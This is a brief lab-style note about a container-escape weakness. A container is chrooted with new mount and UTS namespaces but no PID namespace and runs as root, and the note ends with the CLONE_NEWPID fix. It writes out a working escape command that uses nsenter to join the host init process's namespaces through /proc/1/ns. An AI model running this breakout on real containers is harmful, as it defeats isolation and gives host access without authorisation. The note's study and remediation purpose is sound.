Setup:
1. container is chroot to /rootfs
2. new mount namespace
3. new uts namespace

Problem:
1. run as root
2. no new pid ns
3. ls -la /proc/self/ns
4. ls -la /proc/1/ns
   can see init namespaces for all namespaces

Escape:
1. nsenter --uts=/proc/1/ns/uts --mount=/proc/1/ns/mnt bash
2. ls -la /proc/self/ns
   can see that the process is in init namespaces now

Fix:
1. add CLONE_NEWPID flag to clone syscall.
